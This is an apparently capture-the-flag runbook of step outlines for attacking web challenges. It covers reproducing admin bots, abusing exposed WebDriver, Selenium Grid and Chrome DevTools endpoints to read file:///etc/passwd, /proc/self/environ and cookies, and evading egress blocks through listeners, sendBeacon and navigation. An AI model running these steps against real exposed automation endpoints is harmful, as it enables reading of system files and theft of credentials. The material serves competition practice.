# Field manual deep — the operational runbook, expanded

## Playbook A: the bot-reproduction pipeline

```
1. extract the spec
   bot.js/admin.py -> {url, credential, wait_ms, flags[], version}
2. stand up the challenge locally (handout / docker compose)
3. build the local driver
   args = spec.flags; version = spec.version
4. set the credential
   add_cookie({name, domain, path, httpOnly, sameSite} = spec.credential)
5. instrument
   console + pageerror + request + requestfailed hooks
6. navigate + wait
   goto(spec.url); wait(spec.wait_ms or spec.wait_condition)
7. verify
   page.content() matches the live view on the DOM axes
8. develop
   canary -> staged markers -> iterate -> full payload confirmed
9. check the channel
   goto(your_tunnel) -> is it your body or an interstitial?
10. fire live once -> listener -> pre-flag
```

## Playbook B: the exposed-endpoint read

```
1. POST /session -> sessionId
2. primitive map:
   file?   nav file:///etc/passwd -> source has "root:x:0:0"
   js?     execute return 1+1 -> 2
   loop?   nav localhost/admin -> source differs from external
   jar?    GET /cookies -> non-empty
3. flag surface:
   file?      file:///flag or /proc/self/environ -> source
   route?     localhost/flag-route -> source
   cookie?    GET /cookies -> flag cookie
   storage?   execute localStorage -> flag
   page?      execute fetch("/flag") -> flag
   rendered?  GET /screenshot -> decode PNG
4. read the flag -> pre-flag
5. DELETE /session
```

## Playbook C: the Grid

```
1. GET :4444/status -> node inventory (browsers/versions/platforms)
2. POST /session {capabilities matching a node's stereotype}
3. primitive map as in B — reads hit the NODE's fs/network
4. note: node.localhost != app.localhost; reads are the node's
5. DELETE
```

## Playbook D: CDP

```
1. GET :9222/json -> targets -> webSocketDebuggerUrl
2. attach ws -> Page.enable, Network.enable, Runtime.enable
3. Page.navigate {url: file:///flag}
4. Runtime.evaluate {expression: document.body.innerText, awaitPromise:true}
5. or Page.captureScreenshot -> PNG
```

## Playbook E: the stalled reproduction

```
local works, live fails ->
1. re-derive the spec: URL/cookie/wait/flags/version — find the diff
2. is it a real browser bot? -> JS canary to the "bot"
3. wait long enough? -> measure payload time vs bot wait
4. channel dead? -> goto own tunnel inside driver
5. none -> the kill-map record; escalate via decide.py
```

## Playbook F: the egress block

```
off-origin blocked ->
1. CSP connect-src? -> img/script subresource
2. all external? -> same-origin write-back (profile/note)
3. navigation? -> top.location to listener
4. beacon? -> sendBeacon survives nav
5. read back the stashed value -> pre-flag
```
